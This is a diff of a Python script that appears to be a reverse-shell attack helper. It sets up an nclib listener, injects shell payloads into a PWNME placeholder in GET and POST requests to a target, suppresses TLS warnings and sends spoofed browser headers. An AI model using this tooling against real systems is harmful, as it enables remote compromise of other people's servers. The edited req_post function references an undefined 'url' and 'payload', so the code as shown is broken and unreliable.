@@ -7,8 +7,11 @@ import os
 import argparse
 import nclib
 from threading import Thread
-import urllib.parse
 import ipaddress
+import urllib3
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def main():
 	global args , default_ip , nc , port , ip , domain , method
@@ -43,7 +46,7 @@ def shell_linux():
 	print("listening on port: "+ f"{port}" + "\n" + "Default ip for payloads: "+ f"{ip}")
 	print ("---> Waiting For a connection ")
 	is_valid()
-	link()
+	#link()
 	listener()
 
 
@@ -75,15 +78,14 @@ def link():
 		return False
 
 def req_post():
-	url = domain.replace('PWNME','127.0.0.1') #payload will be the revshells
-	headers=''
+	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
 	cookies=''
 	data=''
-	r=requests.post(url)
+	data = data.replace('PWNME',payload) #Specify a payload
+	r=requests.post(url,headers=headers)
 
 def req_get():
 	url = domain.replace('PWNME','127.0.0.1') #payload will be the revshells
-	headers=''
 	cookies=''
 	r=requests.get(url)
 
